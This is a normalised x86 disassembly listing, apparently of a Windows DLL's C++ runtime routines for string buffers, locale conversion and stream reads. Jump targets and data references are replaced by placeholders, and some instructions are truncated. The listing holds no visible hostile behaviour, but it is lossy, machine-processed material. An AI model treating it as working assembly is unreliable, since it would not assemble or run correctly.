cmp [ esi + 0x18 ] 0x8
jb r-xdata
call sub_1000f9c4
mov eax [ esi + 0x14 ]
lea ecx [ eax + ebx ]
cmp ecx eax
jae r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
test ebx ebx
jbe r-xdata
pop edi
pop esi
retn 0x4
sub edi eax
push ebx
sar edi 0x1
push edi
mov eax esi
mov ecx esi
call sub_10006f31
jmp r-xdata
mov eax esi
mov edi [ esi + 0x14 ]
add edi ebx
call sub_10001e1d
test al al
je r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x8
jb r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov ecx [ esi + 0x14 ]
push [ esp + 0xc ]
sub eax ecx
push eax
lea eax [ edx + ecx * 2 ]
push eax
mov eax ebx
call sub_100023dd
add esp 0xc
mov ecx edi
mov eax esi
call sub_10001e05
sub_1000706e
push 0x14
mov eax sub_10026b38
call sub_10014246
mov esi [ ebp + 0x8 ]
call sub_10011b0a
mov edi eax
xor eax eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ ebp - 0x4 ] eax
call sub_100105a7
mov eax [ edi + 0x8 ]
call sub_100072ba
mov [ esi + 0x8 ] eax
call sub_100105a7
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
push eax
push r--data
mov [ ebp - 0x14 ] edx
call sub_100074bb
pop ecx
pop ecx
mov [ esi + 0x10 ] eax
call sub_100105a7
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
push eax
push r--data
mov [ ebp - 0x14 ] edx
call sub_100074bb
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
mov [ esi + 0x14 ] eax
call sub_100105a7
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x14 ] edx
movzx eax [ eax ]
push eax
call sub_10007edb
mov [ esi + 0xc ] ax
call sub_100105a7
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0x14 ] edx
movzx eax [ eax ]
push eax
call sub_10007edb
mov [ esi + 0xe ] ax
call sub_100105a7
mov eax r--data
call sub_100072ba
mov [ esi + 0x8 ] eax
call sub_100105a7
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
push eax
push 0x2e
mov [ ebp - 0x14 ] edx
call sub_10007edb
mov [ esi + 0xc ] ax
call sub_100105a7
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
push 0x2c
mov [ ebp - 0x1c ] edx
call sub_10007edb
add esp 0x20
mov [ esi + 0xe ] ax
call sub_100142eb
retn 0x4
sub_10007170
mov esi [ ebp + 0x8 ]
push [ esi + 0x8 ]
call sub_10011c26
push [ esi + 0x10 ]
call sub_10011c26
push [ esi + 0x14 ]
call sub_10011c26
add esp 0xc
xor eax eax
push eax
push eax
call sub_10013de1
int3
sub_10007198
push ebp
mov ebp esp
sub esp 0x24
and [ ebp - 0x4 ] 0x0
push ebx
push esi
mov esi eax
cmp [ esi + 0x18 ] 0x8
lea eax [ esi + 0x4 ]
push edi
mov [ ebp - 0x4 ] eax
jb r-xdata
mov ecx [ esi + 0x14 ]
lea ebx [ eax + ecx * 2 ]
lea edi [ ebp - 0xc ]
call sub_10007457
cmp [ esi + 0x18 ] 0x8
mov eax [ ebp - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
jb r-xdata
mov eax [ eax ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
jmp r-xdata
lea edi [ ebp - 0xc ]
call sub_10007457
mov eax [ ebp - 0xc ]
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
xor ecx ecx
mov eax ebx
mov [ ebx + 0x18 ] 0x7
call sub_10001e05
push [ ebp + 0xc ]
lea esi [ ebp - 0x18 ]
sub esp 0xc
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub esp 0xc
mov edi esp
lea esi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call sub_100072ef
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn
sub_10007238
push 0x4
mov eax sub_10026ab1
call sub_10014246
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_10010c96
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_100142eb
retn 0x4
sub_10007295
push ebp
mov ebp esp
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
dec [ ebp + 0xc ]
add [ ebp + 0x8 ] 0x8
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
call sub_1000b932
sub_100072ba
push esi
push edi
mov edi eax
push edi
call sub_10010990
mov esi eax
inc esi
push esi
call sub_100106f3
pop ecx
pop ecx
mov ecx eax
jmp r-xdata
test esi esi
ja r-xdata
mov dl [ edi ]
dec esi
mov [ ecx ] dl
inc ecx
inc edi
pop edi
pop esi
retn
sub_100072ef
push 0x4
mov eax sub_1002708c
call sub_10014246
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
cmp ecx [ ebp + 0x1c ]
je r-xdata
test eax eax
je r-xdata
call sub_100142eb
retn 0x20
cmp eax 0xfffffffc
je r-xdata
call sub_10010b92
mov eax [ ebp + 0xc ]
cmp eax [ ebp + 0x18 ]
je r-xdata
mov eax [ ebp + 0x10 ]
push [ ebp + 0x14 ]
movzx edi [ eax ]
call sub_100079e4
mov edx [ eax ]
pop ecx
push edi
mov ecx eax
call [ edx + 0x20 ]
movzx eax ax
movzx ebx ax
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax 0x1
ja r-xdata
test eax eax
jne r-xdata
mov edi [ esi + 0x14 ]
inc edi
call sub_10001e1d
test al al
je r-xdata
call sub_1000f9c4
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_10010b92
mov eax [ ebp + 0xc ]
mov eax [ ebp + 0xc ]
cmp eax 0xfffffffc
je r-xdata
cmp [ esi + 0x18 ] 0x8
mov ecx [ esi + 0x14 ]
jb r-xdata
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
add [ ebp + 0x10 ] 0x2
jmp r-xdata
test eax eax
jne r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
call sub_10010b92
mov eax [ eax + 0x14 ]
lea eax [ ecx + eax * 2 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp eax 0xfffffffc
je r-xdata
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_10010b92
mov eax [ ebp + 0xc ]
mov [ eax + ecx * 2 ] bx
mov ecx edi
mov eax esi
call sub_10001e05
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_10010b92
mov eax [ ebp + 0xc ]
mov edx [ eax + 0x14 ]
lea ecx [ ecx + edx * 2 ]
cmp [ ebp + 0x10 ] ecx
jb r-xdata
sub_10007408
cmp [ esp + 0x4 ] 0x1
jne r-xdata
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
pop edi
mov ecx [ esp + 0x8 ]
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
shr ecx 0x1
[ edi ]
adc ecx ecx
[ edi ]
cmp [ esp + 0x4 ] 0x0
push edi
lea edi [ ecx + edx * 2 ]
jbe r-xdata
retn 0x4
mov [ ecx + edx * 2 ] ax
jmp r-xdata
sub_10007457
and [ edi ] 0x0
test esi esi
je r-xdata
call sub_10010b92
test ebx ebx
je r-xdata
mov edx [ esi + 0x18 ]
lea eax [ esi + 0x4 ]
cmp edx 0x8
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
cmp ecx ebx
ja r-xdata
mov ecx [ esi + 0x14 ]
lea eax [ eax + ecx * 2 ]
cmp ebx eax
jbe r-xdata
mov eax [ eax ]
mov [ edi ] esi
mov [ edi + 0x4 ] ebx
mov eax edi
retn
sub_10007495
push esi
push edi
mov edi eax
mov esi ecx
jmp r-xdata
cmp esi [ esp + 0xc ]
jne r-xdata
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
retn
add edi 0x8
add esi 0x8
mov ecx esi
mov eax edi
call sub_1000b932
sub_100074bb
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0xc ] edi
call sub_10010990
mov esi eax
mov eax [ ebp + 0x8 ]
inc esi
pop ecx
mov ebx esi
mov [ ebp - 0x8 ] eax
je r-xdata
inc edi
xor ecx ecx
push 0x2
pop edx
mov eax edi
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_100106f3
and [ ebp - 0x10 ] 0x0
mov ebx eax
pop ecx
mov [ ebp - 0x8 ] ebx
jmp r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
push ebx
push [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
call sub_1001012d
add esp 0x14
test eax eax
jle r-xdata
test edi edi
ja r-xdata
add [ ebp - 0x8 ] eax
sub ebx eax
inc edi
test ebx ebx
ja r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
push esi
push [ ebp + 0x8 ]
push ebx
call sub_1001012d
add esp 0x14
test eax eax
jle r-xdata
pop edi
xor eax eax
mov [ ebx ] ax
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
leave
retn
add [ ebp + 0x8 ] eax
dec edi
inc ebx
inc ebx
sub_10007556
push esi
test edx edx
jbe r-xdata
xor eax eax
pop esi
retn
mov si [ eax ]
cmp si [ ecx ]
jne r-xdata
movzx eax [ eax ]
cmp ax [ ecx ]
pop esi
sbb eax eax
and eax 0xfffffffe
inc eax
retn
inc eax
inc eax
inc ecx
inc ecx
dec edx
jne r-xdata
sub_1000757c
push esi
mov esi eax
cmp edi [ esi + 0x14 ]
jbe r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
call sub_10010b92
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + edi ]
pop esi
retn
sub_1000759c
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
jmp r-xdata
mov eax [ ecx ]
movzx edx dl
push edx
call [ eax + 0x4 ]
retn
mov eax [ ecx + 0x34 ]
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
push esi
lea esi [ eax + 0x1 ]
mov [ ecx ] esi
mov [ eax ] dl
movzx eax dl
pop esi
retn
test eax eax
jle r-xdata
sub_100075d2
push 0x0
mov eax sub_10027f26
call sub_10014213
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call j_sub_10015995
test al al
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x28 ]
test eax eax
je r-xdata
mov ecx [ esi ]
call sub_10008391
call sub_100142eb
retn 0x4
lea ecx [ eax + 0x4 ]
call sub_1000ff37
sub_10007618
push 0x0
mov eax sub_10027f26
call sub_10014213
mov ebx [ ebp + 0x8 ]
mov [ ebx ] edi
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x28 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea ecx [ eax + 0x4 ]
call sub_1000ff2e
mov eax [ edi ]
mov eax [ eax + 0x4 ]
cmp [ eax + edi + 0x8 ] 0x0
sete al
mov [ ebx + 0x4 ] al
mov eax ebx
call sub_100142eb
retn 0x4
mov eax [ eax + 0x2c ]
test eax eax
je r-xdata
mov esi eax
call sub_10008603
sub_100076ce
push esi
mov esi [ esp + 0xc ]
push edi
mov edi ecx
jmp r-xdata
cmp esi [ esp + 0x14 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
push [ esp + 0x10 ]
mov ecx edi
call [ edx + 0x8 ]
test al al
jne r-xdata
pop edi
mov eax esi
pop esi
retn 0xc
inc esi
inc esi
sub_10007717
push esi
mov esi [ esp + 0xc ]
push edi
mov edi ecx
jmp r-xdata
cmp esi [ esp + 0x14 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
push [ esp + 0x10 ]
mov ecx edi
call [ edx + 0x8 ]
test al al
je r-xdata
pop edi
mov eax esi
pop esi
retn 0xc
inc esi
inc esi
sub_10007743
push esi
mov esi [ esp + 0x8 ]
cmp esi [ esp + 0xc ]
je r-xdata
mov eax esi
pop esi
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_1001062a
mov [ esi ] ax
inc esi
inc esi
pop ecx
pop ecx
cmp esi [ esp + 0x10 ]
jne r-xdata
pop edi
sub_10007782
push esi
mov esi [ esp + 0x8 ]
cmp esi [ esp + 0xc ]
je r-xdata
mov eax esi
pop esi
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_100105bd
mov [ esi ] ax
inc esi
inc esi
pop ecx
pop ecx
cmp esi [ esp + 0x10 ]
jne r-xdata
pop edi
sub_100077e4
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
add eax 0x18
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_1001012d
add esp 0x14
test eax eax
mov eax 0xffff
jl r-xdata
leave
retn 0x4
movzx eax [ ebp - 0x4 ]
sub_10007818
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
sub eax esi
mov ebx ecx
cmp [ ebp + 0x14 ] eax
jae r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
call sub_10010b92
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
push edi
mov edi [ ebp + 0x10 ]
movzx eax [ esi ]
push eax
mov eax ebx
call sub_100077e4
mov [ edi ] ax
inc esi
inc edi
inc edi
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_10007859
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub edx [ ebp + 0x8 ]
mov eax [ ecx ]
sar edx 0x1
push edx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x38 ]
pop ebp
retn 0x10
sub_1000788b
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
add eax 0x18
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_10010520
add esp 0x10
cmp eax 0x1
mov al [ ebp + 0x10 ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10010789
leave
retn 0xc
mov al [ ebp - 0xc ]
sub_100078d2
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
sub eax esi
sar eax 0x1
mov ebx ecx
cmp [ ebp + 0x18 ] eax
jae r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
call sub_10010b92
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
movzx eax [ esi ]
push eax
push ebx
call sub_1000788b
inc esi
inc esi
mov [ edi ] al
inc edi
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_10007916
push 0xa8
mov eax sub_1002706e
call sub_10014213
mov esi [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp esi edi
je r-xdata
push 0x2
pop eax
call sub_100142eb
retn
cmp [ esi ] edi
jne r-xdata
push 0x20
call sub_10010c96
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] edi
cmp ebx edi
je r-xdata
xor ebx ebx
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0xc ]
call sub_10007cfd
push eax
lea eax [ ebp - 0xb4 ]
mov [ ebp - 0x4 ] 0x1
push eax
mov [ ebp - 0x10 ] 0x1
call sub_10007ca8
lea eax [ ebp - 0x40 ]
push eax
mov [ ebp - 0x10 ] 0x3
mov [ ebx + 0x4 ] edi
mov [ ebx ] r--data
call sub_10007c84
mov esi eax
lea edi [ ebx + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_100105a7
mov esi [ ebp + 0x8 ]
mov [ ebx + 0x18 ] eax
mov [ ebx + 0x1c ] edx
xor edi edi
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea eax [ ebp - 0xb4 ]
push eax
call sub_10007d1a
mov [ ebp - 0x4 ] 0x2
test [ ebp - 0x10 ] 0x2
mov [ esi ] ebx
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_1000197b
sub_100079e4
push 0x14
mov eax sub_10027440
call sub_10014213
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000fe10
and [ ebp - 0x4 ] 0x0
mov edi [ rw-data ]
mov esi rw-data
mov [ ebp - 0x10 ] edi
call sub_10007ab9
mov esi eax
mov eax [ ebp + 0x8 ]
call sub_10007aea
mov esi eax
test esi esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1000fe38
mov eax esi
call sub_100142eb
retn
test edi edi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10007916
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov esi edi
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov ecx esi
mov [ rw-data ] esi
call sub_100086fb
push esi
call sub_1000fbb3
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100108f6
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10013de1
sub_10007a82
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
jmp r-xdata
mov eax [ ecx ]
push edx
call [ eax + 0x4 ]
movzx eax ax
retn
mov eax [ ecx + 0x34 ]
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
push esi
lea esi [ eax + 0x2 ]
mov [ ecx ] esi
mov [ eax ] dx
movzx eax dx
pop esi
retn
test eax eax
jle r-xdata
sub_10007ab9
push ebp
mov ebp esp
push ecx
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
leave
retn
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_1000fe10
cmp [ esi ] 0x0
jne r-xdata
lea ecx [ ebp - 0x4 ]
call sub_1000fe38
inc [ rw-data ]
mov eax [ rw-data ]
mov [ esi ] eax
sub_10007aea
mov ecx [ eax ]
cmp esi [ ecx + 0xc ]
jae r-xdata
xor eax eax
mov eax [ ecx + 0x8 ]
mov eax [ eax + esi * 4 ]
jmp r-xdata
retn
cmp [ ecx + 0x14 ] al
je r-xdata
test eax eax
jne r-xdata
call sub_1000faee
cmp esi [ eax + 0xc ]
jae r-xdata
xor eax eax
mov eax [ eax + 0x8 ]
mov eax [ eax + esi * 4 ]
retn
sub_10007b34
push esi
mov esi ecx
mov eax [ esi + 0x14 ]
mov [ esi ] r--data
test eax eax
jle r-xdata
jge r-xdata
push [ esi + 0x10 ]
call sub_10011c31
jmp r-xdata
mov [ esi ] r--data
pop esi
retn
push [ esi + 0x10 ]
call sub_10011c26
pop ecx
sub_10007b61
push esi
mov esi [ esp + 0x8 ]
cmp esi [ esp + 0xc ]
je r-xdata
mov eax esi
pop esi
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_100102a1
mov [ esi ] al
inc esi
pop ecx
pop ecx
cmp esi [ esp + 0x10 ]
jne r-xdata
pop edi
sub_10007ba0
push esi
mov esi [ esp + 0x8 ]
cmp esi [ esp + 0xc ]
je r-xdata
mov eax esi
pop esi
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_1001040e
mov [ esi ] al
inc esi
pop ecx
pop ecx
cmp esi [ esp + 0x10 ]
jne r-xdata
pop edi
sub_10007c02
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
sub esi [ ebp + 0x8 ]
cmp [ ebp + 0x14 ] esi
jae r-xdata
push esi
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_10010bad
mov eax [ ebp + 0xc ]
add esp 0x10
pop esi
pop ebp
retn 0x10
call sub_10010b92
sub_10007c30
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub edx [ ebp + 0x8 ]
mov eax [ ecx ]
push edx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x28 ]
pop ebp
retn 0x10
sub_10007c56
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
sub esi [ ebp + 0x8 ]
cmp [ ebp + 0x18 ] esi
jae r-xdata
push esi
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
call sub_10010bad
mov eax [ ebp + 0xc ]
add esp 0x10
pop esi
pop ebp
retn 0x14
call sub_10010b92
sub_10007c84
push ebp
mov ebp esp
sub esp 0x10
push esi
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_100103ae
mov edi [ ebp + 0x8 ]
mov esi eax
mov eax [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
movsd [ edi ] [ esi ]
pop edi
pop esi
leave
retn 0x4
sub_10007ca8
push 0x0
mov eax sub_10026bd3
call sub_10014213
mov edi [ ebp + 0x8 ]
push 0x0
mov ecx edi
call sub_1000fe10
and [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x4 ]
call sub_100016a9
lea esi [ edi + 0x20 ]
call sub_100016a9
lea esi [ edi + 0x3c ]
call sub_100016a9
lea esi [ edi + 0x58 ]
call sub_100016a9
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x4
push edi
call sub_1000fd5a
pop ecx
pop ecx
mov eax edi
call sub_100142eb
retn 0x8
sub_10007d1a
push 0x0
mov eax sub_10026bd3
call sub_10014213
mov esi [ ebp + 0x8 ]
push esi
mov [ ebp - 0x4 ] 0x4
call sub_1000fbf1
pop ecx
push 0x0
push 0x1
lea ecx [ esi + 0x58 ]
call sub_1000197b
push 0x0
push 0x1
lea ecx [ esi + 0x3c ]
call sub_1000197b
push 0x0
push 0x1
lea ecx [ esi + 0x20 ]
call sub_1000197b
push 0x0
push 0x1
lea ecx [ esi + 0x4 ]
call sub_1000197b
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_1000fe38
call sub_100142eb
retn 0x4
sub_10007d7a
push 0xa8
mov eax sub_1002706e
call sub_10014213
mov esi [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp esi edi
je r-xdata
push 0x2
pop eax
call sub_100142eb
retn
cmp [ esi ] edi
jne r-xdata
push 0x18
call sub_10010c96
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] edi
cmp ebx edi
je r-xdata
xor ebx ebx
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0xc ]
call sub_10007cfd
push eax
lea eax [ ebp - 0xb4 ]
mov [ ebp - 0x4 ] 0x1
push eax
mov [ ebp - 0x10 ] 0x1
call sub_10007ca8
lea eax [ ebp - 0x40 ]
push eax
mov [ ebp - 0x10 ] 0x3
mov [ ebx + 0x4 ] edi
mov [ ebx ] r--data
call sub_10007c84
lea edi [ ebx + 0x8 ]
mov esi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp + 0x8 ]
xor edi edi
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea eax [ ebp - 0xb4 ]
push eax
call sub_10007d1a
mov [ ebp - 0x4 ] 0x2
test [ ebp - 0x10 ] 0x2
mov [ esi ] ebx
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_1000197b
sub_10007e3d
push 0x14
mov eax sub_10027440
call sub_10014213
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000fe10
and [ ebp - 0x4 ] 0x0
mov edi [ rw-data ]
mov esi rw-data
mov [ ebp - 0x10 ] edi
call sub_10007ab9
mov esi eax
mov eax [ ebp + 0x8 ]
call sub_10007aea
mov esi eax
test esi esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1000fe38
mov eax esi
call sub_100142eb
retn
test edi edi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10007d7a
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov esi edi
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov ecx esi
mov [ rw-data ] esi
call sub_100086fb
push esi
call sub_1000fbb3
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100108f6
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10013de1
sub_10007edb
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_1001012d
mov ax [ ebp - 0x4 ]
add esp 0x14
leave
retn
sub_10007f07
push ecx
push ebx
xor ebx ebx
push esi
push ebx
push edi
xor ecx ecx
mov [ edi + 0x24 ] ebx
mov [ edi + 0x4 ] ebx
mov [ edi + 0xc ] ebx
mov [ edi + 0x10 ] 0x201
mov [ edi + 0x14 ] 0x6
mov [ edi + 0x18 ] ebx
mov [ edi + 0x1c ] ebx
mov [ edi + 0x20 ] ebx
call sub_100084c5
push 0x4
call sub_10010c96
pop ecx
cmp eax ebx
je r-xdata
xor eax eax
mov esi eax
call sub_10008723
jmp r-xdata
pop esi
mov [ edi + 0x24 ] eax
pop ebx
pop ecx
retn
sub_10007f92
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
lea edx [ ecx + 0x1 ]
mov [ eax ] edx
movzx eax [ ecx ]
pop esi
retn
or eax eax
pop esi
retn
sub_10007fb7
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x10 ] 0x0
push edi
mov edi ecx
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
leave
retn 0xc
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
mov ecx [ edi + 0x30 ]
mov esi [ ecx ]
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x14 ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x10 ] esi
jge r-xdata
test esi esi
jle r-xdata
pop esi
pop ebx
mov [ ebx ] al
inc ebx
inc [ ebp - 0x4 ]
dec [ ebp + 0x10 ]
push esi
push [ eax ]
push [ ebp + 0xc ]
push ebx
call sub_1000102e
mov eax [ edi + 0x30 ]
sub [ eax ] esi
mov eax [ edi + 0x20 ]
add [ ebp - 0x4 ] esi
sub [ ebp + 0x10 ] esi
add esp 0x10
add ebx esi
add [ eax ] esi
jmp r-xdata
mov esi [ ebp + 0x10 ]
mov eax [ edi + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
sub_10008032
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
push edi
